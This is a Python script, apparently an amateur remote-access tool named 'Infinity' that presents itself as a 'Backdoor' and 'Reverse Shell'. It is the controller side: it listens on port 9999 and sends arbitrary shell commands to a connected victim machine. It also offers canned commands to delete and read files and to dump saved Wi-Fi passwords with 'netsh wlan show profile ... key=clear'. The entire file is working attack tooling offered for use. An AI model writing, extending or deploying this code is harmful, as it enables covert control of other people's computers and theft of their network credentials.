

import time
import os
import socket
import threading
import re, uuid, platform
import subprocess
from subprocess import check_output
import sys
from queue import Queue








#create socket
def socket_create():
	try:
		global comip
		global host
		global port
		global s
		host = (comip)
		port = (9999)
		s = socket.socket()

	except socket.error as msg:
		print ("Socket creation error: " + str(msg))

#bind to port and wait for connection from client
def socket_bind():
	try:
		global host
		global port
		global s
		s.bind((host, port))
		s.listen(20)

	except socket.error as msg:
		print("\nSocket bindding error: " + str(msg) + ("\nRetry..."))
		socket_bind()

#Establish a connection with client (socket must be listening for them)
def socket_accept():
	conn, address = s.accept()
	print("Connection has been esablished | " + "IP " + address[0] + " | Port " + str(address[1]) + ("\nEnter [list!] for Infinity commands"))

	send_commands(conn)
	conn.close()


def send_commands(conn):
	while True:
		try:
			cmd = input("|Infinity|-> ")
			if cmd == ("quit"):
				conn.send(str.encode(cmd))
				time.sleep(1)
				conn.close()
				s.close()
				main()

			elif (cmd) == ("list!"):
				print("___________________________________ ")
				print("              |List|                ")
				print("___________________________________ ")
				print("")
				print("\n m!: Make text file                 ")
				print("\n d!: Delete file                  ")
				print("\n r!: Read a file                  ")
				print("\n WP!: Show info of wifi           ")
				print("\n SW!: Show past wifi connections  ")
				print("\n TK!: Make client talk(use dashes instead of spaces)\n")
				send_commands(conn)




			elif (cmd) == ("TK!"):
				tk_input = input("Enter Text:")
				conn.send(str.encode("python txt_speech.py ") + (str.encode(tk_input)))






			elif (cmd) == ("m!"):
				make_txt_name = input("\nName of file: ")
				make_txt_content = input("\nContent: ")
				conn.send(str.encode(('echo ') + ("'") + (make_txt_content) + ("' >") + (make_txt_name) ))


			elif (cmd) == ("d!"):
				del_file_name = input("\nName of file: ")
				conn.send(str.encode(("del ") + (del_file_name)))

			elif (cmd) == ("r!"):
				read_file_name = input("Name of txt file: ")
				conn.send(str.encode(("more ") + (read_file_name)))
				client_response = str(conn.recv(8192), ("utf-8"))
				print(client_response, end=(""))

			elif (cmd) == ("SW!"):
				conn.send(str.encode("netsh wlan show profile"))
				client_response = str(conn.recv(8192), ("utf-8"))
				print(client_response, end=(""))

			elif (cmd) == ("WP!"):
				wifi_name_choice = input("Name of wifi: ")
				conn.send(str.encode(("netsh wlan show profile ") + (wifi_name_choice) + (" key=clear")))
				client_response = str(conn.recv(8192), ("utf-8"))
				print(client_response, end=(""))




			else: 
					if len(str.encode(cmd)) > (0):
						conn.send(str.encode(cmd))
						client_response = str(conn.recv(8192), ("utf-8"))
						print(client_response, end=(""))

		except OSError:
			print("\nClient left session...")
			OsError_rec = input("\nEnter anything to go to start... ")

			if len(str(OsError_rec)) > (0):
				main()

			else:
				main()


def main():
	global comip
	#computer local ip
	comip = (check_output(['hostname', '--all-ip-addresses']))
	#computer name
	comhostname = (socket.gethostname())
	#computer mac
	commac = (':'.join(re.findall('..', '%012x' % uuid.getnode())))
	#computer OS
	OS = (platform.system())
	 
	os.system("clear")
	print("                            ")
	print("      ^                     ")
	print("    ^   ^    info:          ")
	print("    ^   ^      IP: " + (comip.decode('utf-8')))
	print("    ^^  ^      Hostname: " + comhostname)
	print("      ^        Computer Mac: " + commac)
	print("    ^  ^^      Computer OS: " + OS)
	print("    ^   ^                   ")
	print("    ^   ^")
	print("     ^^^\n")
	print(" 1: Backdoor\n")


	awn = input("Pick a number (enter [quit] to quit): ")


	if awn == ("1"):
		os.system("clear")

		print("   ")
		print("  /|")
		print(" / |_____________")
		print("/   Reverse Shell|")
		print("\   _____________|")
		print(" \ |")
		print("  \|")

		

		def backdoor_start():
			try:
				socket_create()
				socket_bind()
				socket_accept()

			except RecursionError:
				os.system("clear")
				print("[!]FATAL ERROR[!]\n\nTry again later...\n")

		backdoor_start()

	elif awn == ("quit"):
		sys.exit()




	else:
		main()


main()